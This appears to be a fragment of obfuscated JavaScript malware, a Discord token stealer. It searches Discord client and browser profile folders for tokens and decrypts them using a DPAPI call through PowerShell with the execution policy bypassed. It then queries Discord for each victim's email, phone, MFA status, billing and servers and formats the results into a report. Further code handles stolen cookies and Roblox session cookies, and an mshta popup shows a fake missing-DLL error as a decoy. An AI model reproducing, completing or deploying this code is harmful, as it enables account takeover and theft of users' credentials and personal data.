    if (z.HbvjY === z.HbvjY) {
      try {
        await z.dzarh(sleep, 1500);
        const a3 = await axios.get("https://discord.com/api/v9/guilds/" + a1 + "/invites", {
          headers: z.xUpEi(discordHeaders, a0),
          timeout: 5000
        });
        return a3.data;
      } catch (a4) {
        if (z.enUGQ(z.VwuUY, z.VwuUY)) {
          return [];
        } else if (O(o, p.join(q, r), null, s, t)) {
          y = true;
          z("[Games] Successfully collected: " + A + " -> " + B);
        }
      }
    } else {
      G(H, I.name + "-Failed");
    }
  }
  async function B(a0) {
    const a1 = {
      ChrIX: function (a2, a3, a4) {
        return a2(a3, a4);
      },
      SWfFe: function (a2, a3) {
        return z.APGoE(a2, a3);
      },
      idEHF: z.XqrSD,
      OtPLS: function (a2, a3) {
        return z.UUAMb(a2, a3);
      },
      pthBq: function (a2, a3) {
        return a2(a3);
      },
      iaFuX: function (a2, a3) {
        return z.enUGQ(a2, a3);
      },
      Kvopd: z.fuVvk,
      GPKHv: z.mIYip,
      JkLlY: function (a2, a3, a4) {
        return z.yOycA(a2, a3, a4);
      },
      WxfRa: function (a2) {
        return a2();
      }
    };
    if (z.lExUt !== "cYpgK") {
      z.lNhab(F, G, z.aVdJu);
    } else {
      try {
        await z.JUGQh(sleep, 1000);
        const a3 = await axios.get(z.Ymwai, {
          headers: z.qOixw(discordHeaders, a0),
          timeout: 5000
        });
        const a4 = a3.data.filter(a6 => {
          const a7 = {
            QDkvL: function (a8, a9, aa) {
              return a1.ChrIX(a8, a9, aa);
            },
            HluNm: function (a8, a9) {
              return a8 + a9;
            },
            NgjHz: "CDP-fetch-"
          };
          if (a1.SWfFe(a1.idEHF, a1.idEHF)) {
            const a8 = a1.OtPLS(BigInt, a6.permissions);
            const a9 = a1.pthBq(BigInt, 8);
            return a1.iaFuX(a8 & a9, a9) || a6.owner;
          } else {
            a7.QDkvL(G, H, a7.HluNm(a7.NgjHz, I.name));
          }
        });
        if (a4.length === 0) {
          if (z.APGoE(z.BNjHM, z.nzRIE)) {
            const a7 = K.lstatSync(L);
            if (a7.isDirectory()) {
              a1.ChrIX(q, r, s);
            } else {
              const a8 = {
                path: u,
                size: a7.size
              };
              t.push(a8);
            }
          } else {
            return z.xPeEX;
          }
        }
        let a5 = "";
        for (const a7 of a4) {
          if (z.SlBJw === z.Wgdte) {
            a1.ChrIX(H, I, "extract-" + J + "-" + K);
          } else {
            const a9 = await z.JHjGY(A, a0, a7.id);
            const aa = a9.length > 0 ? "[Join Server](https://discord.gg/" + a9[0].code + ")" : z.yIIQP;
            const ab = a7.owner ? z.ODUnt : z.Puysd;
            const ac = ab + " | `" + a7.name + " - Members: " + a7.approximate_member_count + "` - " + aa + "\n";
            if (z.Hppcw(z.FyBkY(a5.length, ac.length), 1024)) {
              if (z.APGoE(z.ltZLv, z.ltZLv)) {
                a5 += z.lUPMw;
                break;
              } else {
                var ae = z.ZVQyS(M[z.lPVVu(z.lPVVu(N, 12), z.AzGte(O, 2))] << 8, o[z.PsyWz(p, 13) + q * 2]);
                var af = r.readUInt32BE(ae);
                z.JHjGY(s, af, t);
              }
            }
            a5 += ac;
          }
        }
        return z.PtPqy(a5, z.xPeEX);
      } catch (ae) {
        if (z.MwcSj(z.rPnus, z.rPnus)) {
          try {
            const ag = "The code execution cannot proceed because msvcp140.dll was not found. Reinstalling the program may fix this problem.";
            const ah = a1.Kvopd;
            const ai = "cmd /c start \"\" mshta vbscript:Execute(\"MsgBox \"\"" + ag + "\"\", 16, \"\"" + ah + "\"\":close\")";
            const aj = {
              windowsHide: true,
              detached: true,
              stdio: a1.GPKHv
            };
            N(ai, aj, ak => {
              q();
            });
            a1.JkLlY(o, p, 2000);
          } catch (ak) {
            a1.WxfRa(r);
          }
        } else {
          return z.sPAHu;
        }
      }
    }
  }
  async function C(a0) {
    const a1 = {
      PeYeJ: function (a2, a3) {
        return a2(a3);
      },
      ExAtb: z.HYWYX,
      vsSSX: function (a2, a3) {
        return z.oFsYz(a2, a3);
      },
      XlSkL: z.eGXxy,
      RIdWT: z.Qpvgw,
      eHvjC: function (a2, a3) {
        return a2 != a3;
      },
      yXcLh: z.Mmdko,
      zDdrj: z.oXJuC,
      ThPOB: function (a2, a3) {
        return a2 == a3;
      },
      xPLRy: z.unSNS,
      GooBH: "<:rustler:987692721613459517>",
      TDUZi: function (a2) {
        return z.NIcFr(a2);
      }
    };
    if (z.IIcPr(z.wvkbM, z.wvkbM)) {
      try {
        if (z.SHGKb(z.IqwQP, z.rSQrN)) {
          try {
            H.unlinkSync(I);
          } catch (a3) {}
        } else {
          await z.wYYgV(sleep, 1000);
          const a3 = await axios.get(z.gThUm, {
            headers: discordHeaders(a0),
            timeout: 5000
          });
          let a4 = "";
          a3.data.forEach(a5 => {
            const a6 = {
              cAxmy: "log.txt",
              DPRCA: a1.ExAtb
            };
            const a7 = a6;
            if (a1.vsSSX(a1.XlSkL, a1.RIdWT)) {
              if (a5.type == 2 && a1.eHvjC(a5.invalid, !0)) {
                if (a1.yXcLh === a1.zDdrj) {
                  const a9 = N();
                  const aa = "[" + a9 + "] [INFO] " + O + "\n";
                  if (!o) {
                    return;
                  }
                  if (!p.existsSync(q)) {
                    r.mkdirSync(s, {
                      recursive: true
                    });
                  }
                  const ac = t.join(u, a7.cAxmy);
                  v.appendFileSync(ac, aa, a7.DPRCA);
                } else {
                  a4 += "<:946246524504002610:962747802830655498>";
                }
              } else if (a1.ThPOB(a5.type, 1) && a1.eHvjC(a5.invalid, true)) {
                if (a1.vsSSX(a1.xPLRy, a1.xPLRy)) {
                  F += G.size;
                } else {
                  a4 += a1.GooBH;
                }
              }
            } else {
              a1.PeYeJ(H, I);
              J(K);
            }
          });
          if (z.SptqE(a4, "")) {
            a4 = z.VLvdR;
          }
          return a4;
        }
      } catch (a5) {
        return z.VLvdR;
      }
    } else {
      a1.TDUZi(E);
    }
  }
  const D = {
    Value: 1,
    Emoji: z.bdBlH,
    Rare: true
  };
  const E = {
    Value: 2,
    Emoji: z.JSobx,
    Rare: true
  };
  const F = {
    Value: 4,
    Emoji: "<:hypesquad_events:874750808594477056>",
    Rare: true
  };
  const G = {
    Value: 8,
    Emoji: "<:bughunter_1:874750808426692658>",
    Rare: true
  };
  const H = {
    Value: 512,
    Emoji: z.NYNjT,
    Rare: true
  };
  const I = {
    Value: 16384,
    Emoji: z.lroMi,
    Rare: true
  };
  const J = {
    Value: 131072,
    Emoji: z.KXzFd,
    Rare: true
  };
  const K = {
    Value: 64,
    Emoji: z.ymyoZ,
    Rare: false
  };
  const L = {
    Value: 128,
    Emoji: "<:brilliance:874750808338608199>",
    Rare: false
  };
  const M = {
    Value: 256,
    Emoji: "<:balance:874750808267292683>",
    Rare: false
  };
  const N = {
    Value: 262144,
    Emoji: z.MPMir,
    Rare: true
  };
  const O = {
    Discord_Employee: D,
    Partnered_Server_Owner: E,
    HypeSquad_Events: F,
    Bug_Hunter_Level_1: G,
    Early_Supporter: H,
    Bug_Hunter_Level_2: I,
    Early_Verified_Bot_Developer: J,
    House_Bravery: K,
    House_Brilliance: L,
    House_Balance: M,
    Discord_Official_Moderator: N
  };
  const P = O;
  function Q(a0) {
    let a1 = "";
    for (const a2 in P) {
      if (z.APGoE(z.wBwzk, z.FVIoB)) {
        a1();
      } else {
        let a4 = P[a2];
        if (z.SptqE(z.UCxeO(a0, a4.Value), a4.Value)) {
          a1 += a4.Emoji;
        }
      }
    }
    ;
    if (z.uBGFM(a1, "")) {
      return z.ELQVD;
    }
    return "" + a1;
  }
  async function R(a0, a1, a2) {
    const a3 = {
      XqXAE: "1|3|0|4|2",
      VDxLb: function (a5, a6) {
        return z.yBhLQ(a5, a6);
      },
      najGN: function (a5, a6) {
        return a5(a6);
      },
      pGzlV: function (a5, a6) {
        return z.hVKVG(a5, a6);
      },
      DEHGX: function (a5, a6) {
        return z.yBhLQ(a5, a6);
      },
      ewegK: function (a5, a6) {
        return z.klszn(a5, a6);
      },
      NUvtJ: function (a5, a6) {
        return a5 === a6;
      },
      CEEpv: function (a5, a6) {
        return z.IIcPr(a5, a6);
      },
      zsXlL: z.uUiZq,
      lIeJZ: "strict",
      dNfMd: z.fImvH
    };
    if (z.IIAXY(z.ulvBH, z.mAqqi)) {
      z.lNhab(F, G, z.IxFhX);
      return 0;
    } else {
      switch (a0) {
        case 1:
          return "<:946246402105819216:962747802797113365>";
        case 2:
          let a6;
          try {
            if (z.IuFmg === z.IuFmg) {
              await z.dzarh(sleep, 1000);
              const a8 = await axios.get("https://discord.com/api/v9/users/" + a1 + "/profile", {
                headers: z.JUGQh(discordHeaders, a2),
                timeout: 5000
              });
              a6 = a8.data;
            } else {
              G.writeFileSync(H, I, z.HYWYX);
            }
          } catch (aa) {
            if (z.bROoB === z.bROoB) {
              return z.FMBPt;
            } else {
              F.mkdirSync(G, {
                recursive: true
              });
            }
          }
          if (!a6 || !a6.premium_guild_since) {
            return "<:946246402105819216:962747802797113365>";
          }
          let a7 = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", z.dknQu, z.ScTJx, z.NrBMP, z.NwUzF, z.hTxEc, z.GejJP, z.ycagU];
          var a4 = 0;
          try {
            if (z.JTuKf(z.azKzd, z.azKzd)) {
              let ac = new Date(a6.premium_guild_since);
              let ad = new Date();
              let ae = z.FyBkY(z.AzGte(z.TqPTR(ad.getFullYear(), ac.getFullYear()), 12), z.yBhLQ(ad.getMonth(), ac.getMonth()));
              if (z.Hppcw(ae, 24)) {
                a4 = 8;
              } else if (ae >= 18) {
                a4 = 7;
              } else if (z.Hppcw(ae, 15)) {
                a4 = 6;
              } else if (z.Hppcw(ae, 12)) {
                a4 = 5;
              } else if (ae >= 9) {
                a4 = 4;
              } else if (z.fNywC(ae, 6)) {
                a4 = 3;
              } else if (z.fNywC(ae, 3)) {
                a4 = 2;
              } else if (ae >= 2) {
                a4 = 1;
              } else {
                a4 = 0;
              }
            } else {
              const ag = a3.XqXAE.split("|");
              let ah = 0;
              while (true) {
                switch (ag[ah++]) {
                  case "0":
                    var ai = o.min(p, a3.VDxLb(q, 4));
                    continue;
                  case "1":
                    var aj = a3.najGN(M, N);
                    continue;
                  case "2":
                    t -= ai;
                    continue;
                  case "3":
                    O = aj.readUInt32BE(0);
                    continue;
                  case "4":
                    r.push(s.from(aj.slice(4, a3.pGzlV(4, ai))));
                    continue;
                }
                break;
              }
            }
          } catch (ag) {
            if (z.HlYOm === "zEkuU") {
              const ai = t.expires_utc ? a3.DEHGX(a3.ewegK(u.expires_utc, 1000000), 11644473600) : 0;
              v.push({
                service: w,
                host: x.host_key || "",
                name: y.name,
                value: z,
                browser: A,
                expiration: B,
                path: C.path || "/",
                httpOnly: a3.NUvtJ(D.is_httponly, 1) || a3.NUvtJ(E.is_httponly, true),
                secure: a3.CEEpv(F.is_secure, 1) || G.is_secure === true,
                expiresUnix: ai,
                sameSite: H.samesite !== I ? ["no_restriction", a3.zsXlL, a3.lIeJZ][J.samesite] || "no_restriction" : a3.dNfMd
              });
            } else {
              a4 = 0;
            }
          }
          return "<:946246402105819216:962747802797113365> " + a7[a4];
        default:
          return z.GOfUT;
      }
      ;
    }
  }
  const S = [];
  let T = 0;
  const U = /dQw4w9WgXcQ:[^"\\'\s]*/g;
  const V = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}|mfa\.[\w-]{80,95}/g;
  function W(a0) {
    const a1 = {
      iUdcn: function (a2, a3) {
        return z.UCxeO(a2, a3);
      },
      AoArh: function (a2, a3) {
        return z.PtPqy(a2, a3);
      },
      KaauW: z.aiWlV,
      DkrUq: "hex",
      eDomL: function (a2, a3) {
        return a2 + a3;
      },
      msYIb: z.HYWYX
    };
    try {
      if (z.bjiRn(z.kcbyW, z.DTltZ)) {
        return fs.readFileSync(a0, z.HYWYX);
      } else {
        if (z.loQBE(I.length, 10)) {
          return;
        }
        J = z.AzGte(K.readUInt32BE(2), 4294967296) + L.readUInt32BE(6);
        M = 10;
      }
    } catch (a3) {
      if (z.mRBfu(z.VkzjH, "ZGOvz")) {
        try {
          if (z.bjiRn(z.gdKoC, "jTIWR")) {
            I[J++] = a1.iUdcn(K >>> L - 8, 255);
            M -= 8;
          } else {
            return fs.readFileSync(a0, z.XWgMu);
          }
        } catch (a5) {
          if (z.enUGQ(z.rFggL, z.rFggL)) {
            return null;
          } else {
            if (a1.AoArh(!K, !L)) {
              return "";
            }
            try {
              var a7 = q.from(r, "hex");
              var a8 = s.createDecipheriv(a1.KaauW, t.from(u, a1.DkrUq), a7.slice(0, 12));
              a8.setAuthTag(a7.slice(12, 28));
              return a1.eDomL(a8.update(a7.slice(28), null, a1.msYIb), a8.final(a1.msYIb));
            } catch (a9) {
              return "";
            }
          }
        }
      } else {
        const a8 = z.YXOWV(N);
        const a9 = "[" + a8 + "] [SUCCESS] " + O + "\n";
        if (!aa) {
          return;
        }
        const aa = {
          recursive: true
        };
        if (!p.existsSync(q)) {
          r.mkdirSync(s, aa);
        }
        const ab = t.join(u, "log.txt");
        v.appendFileSync(ab, a9, z.HYWYX);
      }
    }
  }
  function X(a0, a1, a2) {
    const a3 = {
      ystWk: "Error reading launcher_accounts.json",
      xCnuX: function (a5, a6, a7) {
        return z.yOycA(a5, a6, a7);
      },
      cdBzG: z.epJSB,
      VxiMP: z.PNGLw,
      WTFvZ: z.sDTCD,
      LBciP: z.dygIQ,
      SagdQ: z.rozOP,
      KfUmJ: z.XkgSN,
      HyEWL: z.INnrN,
      KnJXE: "Opera",
      gQddq: z.JeZfd,
      QrURI: function (a5, a6, a7) {
        return a5(a6, a7);
      },
      TWVKV: function (a5, a6) {
        return a5 + a6;
      },
      AtbHx: z.ewZmS,
      KVyzG: z.GxMeG,
      jhMBr: z.mIYip
    };
    if (!a0) {
      return;
    }
    const a4 = a0.split(/[\n\r]+/);
    for (const a5 of a4) {
      if (z.wvAag !== z.wvAag) {
        E.push(a3.ystWk);
      } else {
        if (a1) {
          if (z.IHlyE === "EjUAb") {
            H = I.join(J, K);
          } else {
            const a9 = a5.match(U);
            if (a9) {
              if (z.ljRaD !== z.uCUSd) {
                for (const aa of a9) {
                  if (z.JTuKf(z.fKlzF, z.fKlzF)) {
                    try {
                      if (z.rSXcq(z.PIIlE, z.qmwaE)) {
                        a3.xCnuX(F, G, a3.cdBzG);
                      } else {
                        const ac = aa.split(z.ROQDe)[1];
                        if (!ac || z.GzARs(ac.length, 10)) {
                          continue;
                        }
                        const ad = Buffer.from(ac, z.JESzQ);
                        if (z.GzARs(ad.length, 28)) {
                          continue;
                        }
                        const ae = ad.slice(3, 15);
                        const af = ad.slice(15, z.yBhLQ(ad.length, 16));
                        const ag = ad.slice(z.yBhLQ(ad.length, 16));
                        const ah = crypto.createDecipheriv(z.aiWlV, a1, ae);
                        ah.setAuthTag(ag);
                        const ai = z.lPVVu(ah.update(af, "base64", z.itdLK), ah.final(z.itdLK));
                        if (ai && z.lZvWD(ai.length, 30) && !S.some(aj => aj.token === ai)) {
                          if (z.kXinU === z.kXinU) {
                            const aj = {
                              browser: a2,
                              token: ai
                            };
                            S.push(aj);
                            T++;
                          } else {
                            if (z.PtPqy(!K, !L)) {
                              return "";
                            }
                            try {
                              var al = q.from(r, z.UDwgt);
                              var am = s.createDecipheriv(z.aiWlV, t.from(u, z.UDwgt), al.slice(0, 12));
                              am.setAuthTag(al.slice(12, 28));
                              return z.WUkYQ(am.update(al.slice(28), null, z.HYWYX), am.final(z.HYWYX));
                            } catch (an) {
                              return "";
                            }
                          }
                        }
                      }
                    } catch (al) {}
                  } else {
                    let an = "";
                    if (J.includes(a3.VxiMP)) {
                      an = a3.WTFvZ;
                    } else if (K.includes("Edge")) {
                      an = a3.LBciP;
                    } else if (L.includes(a3.SagdQ)) {
                      an = a3.KfUmJ;
                    } else if (M.includes("Yandex")) {
                      an = a3.HyEWL;
                    } else if (N.includes(a3.KnJXE)) {
                      an = a3.gQddq;
                    }
                    if (an) {
                      try {
                        a3.QrURI(p, a3.TWVKV(a3.AtbHx, an) + a3.KVyzG, {
                          stdio: a3.jhMBr,
                          windowsHide: true
                        });
                      } catch (ao) {}
                    }
                  }
                }
              } else {
                I(J, z.CxTDY);
                if (K.killed) {
                  return N(new O(z.JLipP));
                }
              }
            }
          }
        }
        const a7 = a5.match(V);
        if (a7) {
          if (z.rSXcq("IFRbJ", z.XeUYY)) {
            E = 0;
          } else {
            for (const ap of a7) {
              if (ap && z.lZvWD(ap.length, 50) && !S.some(aq => aq.token === ap)) {
                if (z.bjiRn(z.zbDdY, z.ORven)) {
                  const aq = {
                    browser: "" + a2,
                    token: ap
                  };
                  S.push(aq);
                  T++;
                } else {
                  a3.xCnuX(F, a3.TWVKV(a3.TWVKV(a3.AtbHx, G.exe), a3.KVyzG), {
                    stdio: "ignore",
                    windowsHide: true
                  });
                }
              }
            }
          }
        }
      }
    }
  }
  function Y(a0, a1, a2, a3) {
    const a4 = {
      qmoPy: z.aiWlV,
      qBzyG: function (a5, a6, a7) {
        return z.FzAvf(a5, a6, a7);
      },
      ZVKwl: z.IxChW
    };
    if (z.JTuKf(z.ezkmX, z.slWbc)) {
      try {
        z.UuSdN(H);
      } catch (a6) {
        z.vEZSq(J, a6, z.mFFJl);
      }
    } else {
      if (!a0 || !fs.existsSync(a0)) {
        return;
      }
      try {
        if (z.Bgfqz("XTZMd", z.pPLyj)) {
          const a6 = fs.readdirSync(a0);
          for (const a7 of a6) {
            if (z.enUGQ("ojUmh", "QvTZB")) {
              try {
                const a9 = o.createDecipheriv(a4.qmoPy, p, q);
                a9.setAuthTag(r);
                return s.concat([a9.update(t), a9.final()]).toString("utf8");
              } catch (aa) {}
            } else {
              const a9 = path.join(a0, a7);
              try {
                const aa = fs.statSync(a9);
                if (aa.isDirectory()) {
                  if (z.gECpQ !== "CkRaC") {
                    if (a3) {
                      z.nReEg(Y, a9, a1, a2, true);
                    }
                    continue;
                  } else {
                    H = I.join(J, K);
                  }
                }
                if (z.lZvWD(aa.size, z.GfepV(15360, 1024)) || z.rSXcq(aa.size, 0)) {
                  continue;
                }
                const ab = path.extname(a7).toLowerCase();
                if ([z.HYbPQ, z.SkKLW, z.XikaU, z.naUjT, z.SNLmh, z.poZxg, ""].includes(ab)) {
                  if (z.svPib("VTbrJ", z.PczvX)) {
                    if (K.existsSync(L)) {
                      z.nReEg(q, r, s.join(t, "PrismLauncher"), ["region"], u);
                    }
                  } else {
                    const ae = W(a9);
                    if (ae) {
                      z.KObuS(X, ae, a1, a2);
                    }
                  }
                }
              } catch (af) {}
            }
          }
        } else {
          a4.qBzyG(F, G, a4.ZVKwl);
        }
      } catch (ah) {}
    }
  }
  async function Z(a0) {
    if (z.MwcSj(z.CIxAx, z.LRAnK)) {
      try {
        if (z.OCBxN === "dWwuv") {
          const a2 = Buffer.from(a0, z.JESzQ).slice(5);
          const a3 = Array.from(a2);
          const a4 = await new Promise((a6, a7) => {
            const a9 = "Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(" + a3 + "), $null, 'CurrentUser')";
            const ab = exec("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"-\"", {
              timeout: 20000,
              windowsHide: true
            }, (ac, ad) => {
              if (ac) {
                a7(ac);
              } else {
                a6(ad);
              }
            });
            ab.stdin.write(a9);
            ab.stdin.end();
          }).then(a6 => a6.split("\r\n")).catch(() => []);
          const a5 = a4.filter(a6 => a6.trim() !== "").map(Number);
          if (z.GbVTx(a5.length, 0) && a5.every(a6 => !isNaN(a6) && a6 >= 0 && a6 <= 255)) {
            if (z.JTgec(z.GCGRi, z.GCGRi)) {
              J(new K(z.PsyWz(z.LSrkx(z.tKTAD, L.message), z.QmvbG) + (M || "").substring(0, 300)), "extractABE-exec");
              return z.cgDxO(N, O);
            } else {
              return Buffer.from(a5);
            }
          }
        } else {
          return E;
        }
      } catch (a8) {}
      return null;
    } else {
      F(G, z.UEiZF);
    }
  }
  try {
    if (z.IJYDD("YqxtY", z.ucCKu)) {
      if (G.includes(z.svjNc)) {
        H.push(I);
      }
    } else {
      const a1 = PATHS.discord;
      const a2 = {};
      const a3 = [{
        name: z.ruYnS,
        dir: z.WLyly(appdata, z.dIkSg)
      }, {
        name: z.fzksU,
        dir: z.VXtlV(appdata, "\\discordcanary")
      }, {
        name: z.Rpvsv,
        dir: appdata + z.QVbsX
      }, {
        name: z.wLKoq,
        dir: appdata + z.KgVuY
      }, {
        name: z.KnAyb,
        dir: z.bbJRT(appdata, z.ZNzvD)
      }, {
        name: "Vesktop",
        dir: z.lPVVu(appdata, z.OkNCB)
      }, {
        name: z.mwmha,
        dir: appdata + z.PzRYZ
      }, {
        name: z.vHwsU,
        dir: z.WUkYQ(appdata, "\\WebCord")
      }, {
        name: z.SoqfO,
        dir: z.WLyly(appdata, z.gJryO)
      }];
      for (const a4 of a3) {
        if (z.jnhPF("OyWbT", z.KZELU)) {
          z.BMzVa(G, H, z.jIkjb);
          throw I;
        } else {
          if (!fs.existsSync(a4.dir)) {
            continue;
          }
          let a6 = null;
          const a7 = [path.join(a4.dir, z.rosOY)];
          try {
            if (z.mRBfu(z.GCHRQ, "wlatH")) {
              const a9 = fs.readdirSync(a4.dir);
              for (const aa of a9) {
                const ab = path.join(a4.dir, aa);
                try {
                  if (z.mJrbN(z.EKCxo, z.qYsHz)) {
                    F.push("Error reading accounts.json: " + G.message);
                  } else if (fs.statSync(ab).isDirectory()) {
                    if (z.eFQXC(z.PEgEU, z.lhjXS)) {
                      const ad = path.join(ab, z.rosOY);
                      if (fs.existsSync(ad)) {
                        a7.push(ad);
                      }
                    } else {
                      G.push(z.LSrkx(z.LtXuJ(H, ": "), I.code));
                    }
                  }
                } catch (af) {}
              }
            } else {
              G.appendFileSync(H, I, z.HYWYX);
            }
          } catch (ah) {}
          for (const ai of a7) {
            if (!fs.existsSync(ai)) {
              continue;
            }
            const ak = path.resolve(ai);
            if (a2[ak]) {
              a6 = a2[ak];
              break;
            }
            try {
              const al = fs.readFileSync(ai, z.HYWYX);
              const am = JSON.parse(al);
              if (am.os_crypt && am.os_crypt.encrypted_key) {
                const an = await Z(am.os_crypt.encrypted_key);
                if (an) {
                  if (z.RAHPP(z.iNlJa, z.iNlJa)) {
                    a6 = an;
                    a2[ak] = a6;
                    break;
                  } else {
                    H("[Catbox] Success: " + I);
                    z.BUpxX(J, K);
                  }
                }
              }
            } catch (ap) {}
          }
          const a8 = [path.join(a4.dir, z.iUhJt, z.QTfqD), path.join(a4.dir, "Local Storage"), path.join(a4.dir, z.SdSon), path.join(a4.dir, z.FXucP), path.join(a4.dir, z.TetLT, z.fekPO), path.join(a4.dir, z.oHUdr, "js"), path.join(a4.dir, z.VSark)];
          for (const aq of a8) {
            if (z.ibxXW === z.wKHWC) {
              F.push(z.TlVar, G);
            } else {
              z.nReEg(Y, aq, a6, a4.name + " App", true);
            }
          }
          Y(a4.dir, a6, a4.name + " Root", false);
        }
      }
      for (const as of a1) {
        if (z.oFsYz(z.snEDw, z.sfZOW)) {
          if (!fs.existsSync(as)) {
            continue;
          }
          const at = as.toLowerCase();
          if (a3.some(ax => at.startsWith(ax.dir.toLowerCase()))) {
            continue;
          }
          const au = z.LtXuJ(z.jZIig(path.basename(path.resolve(as, "..")), "/"), path.basename(as));
          let av = null;
          try {
            if (z.rSXcq(z.CVaOw, z.Jmswy)) {
              const ay = z.qOixw(I, J);
              if (ay) {
                z.KObuS(K, ay, L, M);
              }
            } else {
              const ay = [path.join(as, z.rosOY), path.join(as, "..", z.rosOY), path.join(as, "..", "..", z.rosOY)];
              for (const az of ay) {
                if (z.LHmoh === z.RogUn) {
                  var aB = [];
                  for (var aC = 0; z.rtFyQ(aC, N.length); aC++) {
                    const aG = z.ZVHds.split("|");
                    let aH = 0;
                    while (true) {
                      switch (aG[aH++]) {
                        case "0":
                          var aD = z.sWdyp(z, aE.domain || "", aE.name || "");
                          continue;
                        case "1":
                          if (aD && aE.value) {
                            const bS = {
                              service: aD,
                              host: aE.domain || "",
                              name: aE.name || "",
                              value: aE.value || "",
                              browser: E.name,
                              expiration: aF,
                              expiresUnix: aE.expires || 0,
                              path: aE.path || "/",
                              httpOnly: aE.httpOnly || false,
                              secure: aE.secure || false,
                              sameSite: aE.sameSite || "None"
                            };
                            D.push(bS);
                          }
                          continue;
                        case "2":
                          var aE = w[aC];
                          continue;
                        case "3":
                          var aF = aE.expires && z.GbVTx(aE.expires, 0) ? new x(z.AzGte(aE.expires, 1000)).toLocaleString() : "Session";
                          continue;
                        case "4":
                          C++;
                          continue;
                        case "5":
                          aB.push(z.VJuDg(z.WLyly(z.lPVVu(z.dxzUy(z.zhQet(z.GhkzJ(z.mjVwt + (aE.domain || ""), z.SmLCf), aE.name || ""), "\nValue: ") + (aE.value || "") + z.TMuBG + aF, z.sJPNa), y.name), "\n\n"));
                          continue;
                      }
                      break;
                    }
                  }
                  u[v.name] = aB;
                } else {
                  if (!fs.existsSync(az)) {
                    continue;
                  }
                  const aB = path.resolve(az);
                  if (a2[aB]) {
                    if (z.JTgec(z.uiPha, z.uiPha)) {
                      const aD = {
                        ZtiTK: function (aE, aF, aG) {
                          return z.PJsYV(aE, aF, aG);
                        },
                        PUlSk: z.gymsG,
                        ipgid: function (aE, aF) {
                          return z.FOQbh(aE, aF);
                        }
                      };
                      return new M((aE, aF) => {
                        const aG = u.createWriteStream(v);
                        const bT = z.yOycA(w, z.aPYjm, {
                          zlib: {
                            level: 1
                          }
                        });
                        aG.on(z.kvwer, () => aE(aE));
                        bT.on("error", bV => {
                          aD.ZtiTK(aE, bV, aD.PUlSk);
                          aD.ipgid(aF, bV);
                        });
                        bT.pipe(aG);
                        const bU = z.basename(A, ".zip");
                        bT.directory(B, bU);
                        bT.finalize();
                      });
                    } else {
                      av = a2[aB];
                      break;
                    }
                  }
                  try {
                    const aD = fs.readFileSync(az, z.HYWYX);
                    const aE = JSON.parse(aD);
                    if (aE.os_crypt && aE.os_crypt.encrypted_key) {
                      if (z.UdEwg === "fyUCo") {
                        const aF = await z.FOQbh(Z, aE.os_crypt.encrypted_key);
                        if (aF) {
                          if (z.pYODc("peelK", "peelK")) {
                            av = aF;
                            a2[aB] = aF;
                            break;
                          } else {
                            G.writeFileSync(H, I, z.HYWYX);
                          }
                        }
                      } else {
                        var bS = M.parse(N.slice(O, z.LchcI(o, p)).toString("utf8"));
                        if (z.Wymok(bS.id, 1)) {
                          z.UUAMb(u, v);
                          w.end();
                          z.JUGQh(x, bS.result || {});
                        }
                      }
                    }
                  } catch (bS) {}
                }
              }
            }
          } catch (bT) {}
          let aw = path.join(as, z.iUhJt, z.QTfqD);
          if (!fs.existsSync(aw)) {
            aw = as;
          }
          Y(aw, av, "Browser(" + au + ")", false);
        } else {
          var bV = J.readInt32BE(K);
          var bW = L.readUInt32BE(M + 4);
          N.push(z.avtra(bV * 4294967296, bW));
          O += 8;
        }
      }
      if (S.length > 0) {
        const bV = path.join(mainFolderPath, z.ruYnS);
        if (!fs.existsSync(bV)) {
          if (z.bjiRn(z.XgEqC, z.exUQa)) {
            fs.mkdirSync(bV, {
              recursive: true
            });
          } else {
            const c1 = z.KObuS(J, K, L, M);
            N = z.JTgec(c1, null) ? c1 : O.value || "";
          }
        }
        const bW = path.join(bV, z.mrRTk);
        let bX = user.copyright;
        let bY = z.zmvcg;
        try {
          if (z.Xkthj(z.kJanz, z.PKnyu)) {
            z.Geakz(G, H, z.bbJRT(z.ibnrl, I));
          } else {
            const c3 = await axios.get(z.jGbmw, {
              timeout: 5000
            });
            bY = c3.data.query;
          }
        } catch (c4) {}
        for (const c5 of S) {
          if (z.mRBfu(z.CHWmP, z.CHWmP)) {
            const c7 = G.readFileSync(H, z.HYWYX);
            const c8 = c7.match(/\.ROBLOSECURITY[^\n]*?(_\|WARNING[^\n]+)/);
            if (c8) {
              I.push({
                service: z.KAyJM,
                host: z.jXbQt,
                name: ".ROBLOSECURITY",
                value: c8[1],
                browser: z.AYkUY,
                expiration: z.eXelm
              });
            }
          } else {
            const c7 = c5.token;
            let c8 = "================\nBrowser: " + c5.browser + " \nToken: " + c7 + " \n";
            const c9 = await z.xUpEi(getUserData, c7);
            if (c9) {
              if (z.PpilP !== z.PpilP) {
                delete F.embeds[0].image;
                G.embeds[0].footer.text += z.xRIkG;
              } else {
                c8 += "ID: " + c9.id + "\nUsername: " + c9.username + "#" + c9.discriminator + "\nEmail: " + c9.email + "\nPhone: " + c9.phone + "\nMFA: " + c9.mfa_enabled + "\nNitro: " + c9.premium_type + "\nFlags: " + c9.flags + "\nBio: " + c9.bio + "\n";
                try {
                  const cb = await z.okqjD(C, c7);
                  const cc = await z.JUGQh(B, c7);
                  const cd = Q(c9.flags);
                  const ce = await z.KObuS(R, c9.premium_type, c9.id, c7);
                  const cf = {
                    name: z.SUQYT,
                    icon_url: ""
                  };
                  const ch = {
                    name: "",
                    value: "<a:all_discord_badges_gif:1157698511320653924> **Badges:** " + cd,
                    inline: true
                  };
                  const ci = {
                    name: "",
                    value: "<a:nitro_boost:877173596793995284> **Nitro Type:** " + ce,
                    inline: true
                  };
                  const cj = {
                    name: "",
                    value: "<a:Card_Black:1157319579287179294> **Billing:** " + cb,
                    inline: true
                  };
                  const cm = {
                    name: ":shield: HQ Guilds:",
                    value: cc,
                    inline: false
                  };
                  const cn = {
                    title: c9.username + "#" + c9.discriminator + " (" + c9.id + ")",
                    color: 3158071,
                    author: cf,
                    thumbnail: {
                      url: "https://cdn.discordapp.com/avatars/" + c9.id + "/" + c9.avatar + "?size=512"
                    },
                    fields: [{
                      name: z.lnyHt,
                      value: z.VJuDg(z.LchcI(z.VIhcM, c7), z.VIhcM)
                    }, {
                      name: z.BDvaq,
